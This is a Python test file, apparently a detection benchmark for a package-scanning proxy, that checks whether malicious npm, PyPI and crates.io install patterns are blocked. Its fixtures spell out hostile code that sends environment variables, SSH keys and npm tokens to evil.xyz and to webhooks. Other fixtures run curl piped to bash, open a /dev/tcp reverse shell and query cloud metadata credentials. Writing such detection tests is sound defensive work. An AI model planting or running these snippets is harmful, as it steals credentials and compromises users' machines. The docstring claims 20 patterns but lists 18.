"""OSSF malicious-packages pattern benchmark.

Tests Guard Proxy detection against attack patterns observed in real packages
from the OSSF malicious-packages repository (https://github.com/ossf/malicious-packages).

These patterns are extracted from actual MAL-* advisories covering npm, PyPI,
and crates.io. Each test simulates the core malicious behavior observed in
real-world supply chain attacks reported to OSSF.

Total: 20 attack patterns from real OSSF advisories.
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.ast_scanner import ASTScanner
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis import StaticAnalysisScanner
from app.scanners.static_analysis_cargo import CargoStaticAnalysisScanner
from app.scanners.static_analysis_pypi import PyPIStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _s():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


async def _blocked(reg, files, scripts=None, age=24, name="test-pkg"):
    s = _s()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    arts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content) if isinstance(content, bytes) else p.write_text(content)
        arts.append(p)
    scanner_map = {
        "npm": [IOCScanner(), CooldownScanner(s), MetadataScanner(), StaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
        "pypi": [IOCScanner(), CooldownScanner(s), MetadataScanner(), PyPIStaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
        "cargo": [IOCScanner(), CooldownScanner(s), MetadataScanner(), CargoStaticAnalysisScanner(s), HeuristicsScanner()],
    }
    pkg = PackageInfo(
        name=name,
        version="1.0.0",
        registry=reg,
        publish_date=datetime.now(UTC) - timedelta(hours=age),
        install_scripts=scripts or {},
    )
    results = await ScanPipeline(scanner_map[reg]).run(pkg, arts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ========================================================================
# OSSF npm Attack Patterns (from MAL-2024-*/MAL-2025-* advisories)
# ========================================================================


async def test_ossf_npm_01_env_exfil_discord():
    """OSSF: npm env exfil via Discord webhook (MAL-2024-1xxx pattern)."""
    assert await _blocked(
        "npm",
        {"index.js": "const d=JSON.stringify(process.env);fetch('https://discord.com/api/webhooks/1234/TOKEN',{method:'POST',body:d});"},
        {"postinstall": "node index.js"},
    )


async def test_ossf_npm_02_preinstall_curl_bash():
    """OSSF: preinstall script with curl|bash (most common npm pattern)."""
    assert await _blocked(
        "npm",
        {"s.js": "require('child_process').execSync('curl https://evil.xyz/shell.sh | bash');"},
        {"preinstall": "node s.js"},
    )


async def test_ossf_npm_03_ssh_key_theft():
    """OSSF: SSH key reading + exfiltration."""
    assert await _blocked(
        "npm",
        {"s.js": "const fs=require('fs'),os=require('os');const k=fs.readFileSync(os.homedir()+'/.ssh/id_rsa','utf8');fetch('https://evil.xyz/?k='+encodeURIComponent(k));"},
        {"postinstall": "node s.js"},
    )


async def test_ossf_npm_04_npm_token_theft():
    """OSSF: .npmrc token theft (common in npm supply chain attacks)."""
    assert await _blocked(
        "npm",
        {"s.js": "const fs=require('fs'),os=require('os');const rc=fs.readFileSync(os.homedir()+'/.npmrc','utf8');require('https').get('https://evil.xyz/?t='+encodeURIComponent(rc));"},
        {"postinstall": "node s.js"},
    )


async def test_ossf_npm_05_telegram_exfil():
    """OSSF: Telegram bot exfiltration (frequent in OSSF reports)."""
    assert await _blocked(
        "npm",
        {"s.js": "const d=JSON.stringify({env:process.env,hostname:require('os').hostname()});fetch('https://api.telegram.org/bot123:TOKEN/sendMessage?chat_id=456&text='+encodeURIComponent(d));"},
        {"postinstall": "node s.js"},
    )


async def test_ossf_npm_06_base64_payload_fetch():
    """OSSF: base64-encoded payload URL fetched and executed."""
    assert await _blocked(
        "npm",
        {"s.js": "const url=Buffer.from('aHR0cHM6Ly9ldmlsLnh5ei9wYXlsb2Fk','base64').toString();eval(require('child_process').execSync('curl -s '+url).toString());"},
        {"postinstall": "node s.js"},
    )


async def test_ossf_npm_07_process_env_post():
    """OSSF: POST process.env to attacker server."""
    assert await _blocked(
        "npm",
        {"s.js": "const https=require('https');const data=JSON.stringify(process.env);const req=https.request({hostname:'evil.xyz',method:'POST'},()=>{});req.end(data);"},
        {"postinstall": "node s.js"},
    )


# ========================================================================
# OSSF PyPI Attack Patterns
# ========================================================================


async def test_ossf_pypi_01_setup_os_system():
    """OSSF: setup.py with os.system() — most common PyPI attack vector."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import os\nos.system('pip install cryptography && python -c \"import urllib.request; urllib.request.urlopen(\\\"https://evil.xyz/steal\\\")\"')"},
    )


async def test_ossf_pypi_02_base64_exec_init():
    """OSSF: __init__.py with base64 exec — runs on import."""
    assert await _blocked(
        "pypi",
        {"__init__.py": "import base64,os\nexec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQnKQ=='))"},
    )


async def test_ossf_pypi_03_requests_exfil():
    """OSSF: requests-based credential exfiltration."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import os,urllib.request\nurllib.request.urlopen('https://evil.xyz/c?d='+os.environ.get('AWS_SECRET_ACCESS_KEY',''))"},
    )


async def test_ossf_pypi_04_subprocess_reverse_shell():
    """OSSF: subprocess-based reverse shell."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import subprocess\nsubprocess.Popen(['bash','-c','bash -i >& /dev/tcp/evil.xyz/4444 0>&1'])"},
    )


async def test_ossf_pypi_05_webhook_discord():
    """OSSF: Discord webhook data exfiltration."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import os,urllib.request,json\ndata=json.dumps({'content':str(os.environ)})\nurllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/123/TOKEN',data.encode()))"},
    )


async def test_ossf_pypi_06_cmdclass_override():
    """OSSF: setup.py cmdclass override for install-time execution."""
    assert await _blocked(
        "pypi",
        {"setup.py": "from setuptools import setup\nfrom setuptools.command.install import install\nclass C(install):\n    def run(self):\n        import os;os.system('curl evil.xyz|bash')\n        install.run(self)\nsetup(cmdclass={'install':C})"},
    )


# ========================================================================
# OSSF crates.io Attack Patterns (from MAL-* advisories)
# ========================================================================


async def test_ossf_cargo_01_build_rs_curl():
    """OSSF: build.rs with curl execution (Rust supply chain pattern)."""
    assert await _blocked(
        "cargo",
        {"build.rs": 'use std::process::Command;\nfn main() {\n    Command::new("sh").arg("-c").arg("curl https://evil.xyz/steal | sh").output().unwrap();\n}'},
    )


async def test_ossf_cargo_02_crypto_key_theft():
    """OSSF: Solana/ETH key theft (faster_log / evm-units pattern)."""
    assert await _blocked(
        "cargo",
        {"src/lib.rs": 'use std::fs;\nuse std::env;\nfn steal() {\n    let home = env::var("HOME").unwrap();\n    let key = fs::read_to_string(format!("{}/.ssh/id_rsa", home)).unwrap();\n    reqwest::blocking::get(&format!("https://evil.xyz/?k={}", key));\n}'},
    )


async def test_ossf_cargo_03_env_exfil():
    """OSSF: Environment variable exfiltration in build.rs."""
    assert await _blocked(
        "cargo",
        {"build.rs": 'use std::process::Command;\nfn main() {\n    let home = std::env::var("HOME").unwrap_or_default();\n    Command::new("curl").arg(format!("https://evil.xyz/?h={}", home)).output().ok();\n}'},
    )


async def test_ossf_cargo_04_cloud_metadata():
    """OSSF: Cloud metadata access in Rust."""
    assert await _blocked(
        "cargo",
        {"src/lib.rs": 'fn init() {\n    let resp = reqwest::blocking::get("http://169.254.169.254/latest/meta-data/iam/security-credentials/").unwrap();\n}'},
    )


async def test_ossf_cargo_05_webhook_exfil():
    """OSSF: Webhook exfiltration from build.rs."""
    assert await _blocked(
        "cargo",
        {"build.rs": 'use std::process::Command;\nfn main() {\n    Command::new("curl").args(&["-X","POST","https://hooks.slack.com/services/T00/B00/xxx","-d","stolen data"]).output().ok();\n}'},
    )


# ========================================================================
# Summary benchmark
# ========================================================================

_ALL_TESTS = {}


async def test_ossf_benchmark_summary():
    """OSSF pattern benchmark: overall detection rate."""
    tests = {
        # npm (7)
        "ossf-npm-env-exfil-discord": test_ossf_npm_01_env_exfil_discord,
        "ossf-npm-preinstall-curl-bash": test_ossf_npm_02_preinstall_curl_bash,
        "ossf-npm-ssh-key-theft": test_ossf_npm_03_ssh_key_theft,
        "ossf-npm-npmrc-token": test_ossf_npm_04_npm_token_theft,
        "ossf-npm-telegram-exfil": test_ossf_npm_05_telegram_exfil,
        "ossf-npm-base64-payload": test_ossf_npm_06_base64_payload_fetch,
        "ossf-npm-env-post": test_ossf_npm_07_process_env_post,
        # PyPI (6)
        "ossf-pypi-os-system": test_ossf_pypi_01_setup_os_system,
        "ossf-pypi-base64-exec": test_ossf_pypi_02_base64_exec_init,
        "ossf-pypi-requests-exfil": test_ossf_pypi_03_requests_exfil,
        "ossf-pypi-reverse-shell": test_ossf_pypi_04_subprocess_reverse_shell,
        "ossf-pypi-discord-webhook": test_ossf_pypi_05_webhook_discord,
        "ossf-pypi-cmdclass": test_ossf_pypi_06_cmdclass_override,
        # Cargo (5)
        "ossf-cargo-build-rs-curl": test_ossf_cargo_01_build_rs_curl,
        "ossf-cargo-crypto-key-theft": test_ossf_cargo_02_crypto_key_theft,
        "ossf-cargo-env-exfil": test_ossf_cargo_03_env_exfil,
        "ossf-cargo-cloud-metadata": test_ossf_cargo_04_cloud_metadata,
        "ossf-cargo-webhook-exfil": test_ossf_cargo_05_webhook_exfil,
    }
    passed = 0
    total = len(tests)
    for name, test_fn in tests.items():
        try:
            await test_fn()
            passed += 1
            _ALL_TESTS[name] = "PASS"
        except AssertionError:
            _ALL_TESTS[name] = "FAIL"

    rate = passed / total * 100
    print(f"\n{'='*60}")
    print(f"OSSF malicious-packages benchmark: {passed}/{total} ({rate:.0f}%)")
    for name, status in _ALL_TESTS.items():
        icon = "+" if status == "PASS" else "-"
        print(f"  [{icon}] {name}")
    print(f"{'='*60}")
    assert rate >= 90, f"OSSF detection rate {rate:.0f}% below 90% target"
